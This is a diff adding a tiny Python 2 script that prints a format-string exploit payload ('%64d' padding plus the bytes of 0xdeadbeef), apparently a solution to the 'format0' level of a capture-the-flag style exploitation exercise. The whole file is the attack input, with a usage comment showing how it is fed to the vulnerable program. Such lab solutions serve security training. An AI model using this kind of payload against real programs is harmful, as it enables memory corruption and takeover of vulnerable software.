@@ -1,0 +1,5 @@
+#!/usr/bin/python
+
+#  usage:  $ ./format0 `./format0.txt`
+
+print "%64d" + "\xef\xbe\xad\xde"
